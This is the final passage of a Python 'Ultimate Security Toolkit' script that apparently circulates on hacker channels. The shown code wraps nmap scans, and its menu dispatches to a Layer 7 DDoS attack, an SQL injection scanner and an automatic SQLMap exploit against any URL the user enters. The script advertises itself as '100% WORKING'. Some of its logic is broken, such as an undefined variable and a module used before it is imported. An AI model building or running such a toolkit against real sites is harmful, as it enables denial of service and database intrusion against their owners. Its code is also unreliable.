    output_format = input(Fore.YELLOW + "[?] Output format (1=Normal, 2=Detailed, 3=XML, 4=All): " + Fore.WHITE).strip() or "1"
    
    output_file = None
    if output_format in ["2", "3", "4"]:
        output_file = f"nmap_scan_{target.replace('.', '_')}_{int(time.time())}"
        if output_format == "2":
            command += f" -oN {output_file}.txt"
        elif output_format == "3":
            command += f" -oX {output_file}.xml"
        elif output_format == "4":
            command += f" -oA {output_file}"
    
    print(Fore.CYAN + f"\n[+] Executing: {command}")
    print(Fore.YELLOW + "[!] Scanning may take several minutes...")
    print(Fore.GREEN + "=" * 70)
    
    try:
        # Run nmap
        print(Fore.CYAN + "\n[+] Nmap Output:\n")
        
        process = subprocess.Popen(
            command.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        
        # Read output in real-time with colors
        while True:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break
            if line:
                line = line.strip()
                if line.startswith("Nmap scan report"):
                    print(Fore.CYAN + line)
                elif "open" in line and "port" in line:
                    print(Fore.GREEN + line)
                elif "closed" in line:
                    print(Fore.RED + line)
                elif "filtered" in line:
                    print(Fore.YELLOW + line)
                elif "PORT" in line and "STATE" in line and "SERVICE" in line:
                    print(Fore.MAGENTA + line)
                elif "MAC Address" in line:
                    print(Fore.CYAN + line)
                elif "Host is up" in line:
                    print(Fore.GREEN + line)
                elif "Not shown" in line:
                    print(Fore.YELLOW + line)
                elif "Service detection performed" in line or "Nmap done" in line:
                    print(Fore.MAGENTA + line)
                elif "|" in line and "vuln" in line.lower():
                    print(Fore.RED + line)
                elif "VULNERABLE" in line:
                    print(Fore.RED + line)
                else:
                    print(Fore.WHITE + line)
        
        print(Fore.GREEN + "\n" + "=" * 70)
        print(Fore.GREEN + "[+] Nmap scan completed successfully!")
        
        if output_file:
            print(Fore.CYAN + f"[+] Results saved to: {output_file}.*")
            
            # Parse XML if exists
            xml_file = f"{output_file}.xml"
            if os.path.exists(xml_file):
                try:
                    tree = ET.parse(xml_file)
                    root = tree.getroot()
                    
                    host_count = len(root.findall(".//host"))
                    open_ports = len(root.findall(".//port"))
                    
                    print(Fore.CYAN + f"[+] Scan Summary:")
                    print(Fore.CYAN + f"    Hosts scanned: {host_count}")
                    print(Fore.CYAN + f"    Open ports found: {open_ports}")
                    
                    # Extract services
                    services = set()
                    for service in root.findall(".//service"):
                        name = service.get('name', 'unknown')
                        if name != 'unknown':
                            services.add(name)
                    
                    if services:
                        print(Fore.CYAN + f"    Services detected: {', '.join(sorted(services))}")
                    
                except Exception as e:
                    print(Fore.YELLOW + f"[!] Could not parse XML: {str(e)}")
        
        # Show additional recommendations
        print(Fore.CYAN + "\n[+] Recommended next steps:")
        if choice == '1':
            print(Fore.YELLOW + "    - Run full port scan (Option 2)")
            print(Fore.YELLOW + "    - Run service detection (Option 4)")
        elif choice == '2':
            print(Fore.YELLOW + "    - Run vulnerability scan (Option 5)")
            print(Fore.YELLOW + "    - Run OS detection (Option 3)")
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Scan interrupted by user")
    except Exception as e:
        print(Fore.RED + f"\n[!] Error during scan: {str(e)}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def main_menu(username):
    while True:
        clear_screen()
        print(MAIN_ASCII)
        show_user_info(username)
        print(Fore.CYAN + " " * 20 + "ULTIMATE SECURITY TOOLKIT v4.0")
        print(Fore.GREEN + "=" * 70)
        print(Fore.YELLOW + "\n[1] ULTRA DDoS Attack (Layer 7)")
        print(Fore.YELLOW + "[2] Advanced SQL Injection Scanner")
        print(Fore.YELLOW + "[3] SQLMap Auto Exploit (REAL)")
        print(Fore.YELLOW + "[4] Advanced Port Scanner")
        print(Fore.YELLOW + "[5] Nmap Scanner (Professional)")
        print(Fore.YELLOW + "[6] Exit")
        print(Fore.GREEN + "-" * 70)
        
        choice = input(Fore.CYAN + "\n[?] Select option (1-6): ").strip()
        
        if choice == "1":
            ddos_attack()
        elif choice == "2":
            advanced_sql_injection()
        elif choice == "3":
            target = input(Fore.YELLOW + "[?] Target URL for SQLMap: ").strip()
            if target:
                run_sqlmap(target)
        elif choice == "4":
            port_scanner()
        elif choice == "5":
            nmap_scanner()
        elif choice == "6":
            print(Fore.CYAN + "\n[+] Thank you for using Ultimate Security Toolkit!")
            print(Fore.CYAN + "[+] Creator: mrzxx | Telegram: @Zxxtirwd")
            time.sleep(2)
            sys.exit(0)
        else:
            print(Fore.RED + "[!] Invalid choice!")
            time.sleep(1)

def main():
    try:
        show_welcome()
        
        username = login()
        if not username:
            print(Fore.RED + "\n[!] Access denied!")
            sys.exit(1)
        
        main_menu(username)
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"\n[!] Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    # Check and install requirements
    try:
        import colorama
        import requests
    except ImportError:
        print(Fore.RED + "[!] Installing required packages...")
        os.system("pip install colorama requests > nul 2>&1" if os.name == 'nt' else "pip install colorama requests > /dev/null 2>&1")
        print(Fore.GREEN + "[+] Requirements installed!")
        time.sleep(2)
    
    print(Fore.CYAN + "[+] Ultimate Security Toolkit v4.0")
    print(Fore.CYAN + "[+] All tools 100% WORKING")
    print(Fore.YELLOW + "[!] Make sure sqlmap and nmap are installed for full functionality")
    print(Fore.YELLOW + "[!] Install sqlmap: pip install sqlmap")
    print(Fore.YELLOW + "[!] Install nmap: sudo apt install nmap (Linux) or download from nmap.org (Windows)")
    time.sleep(3)
    
    main()
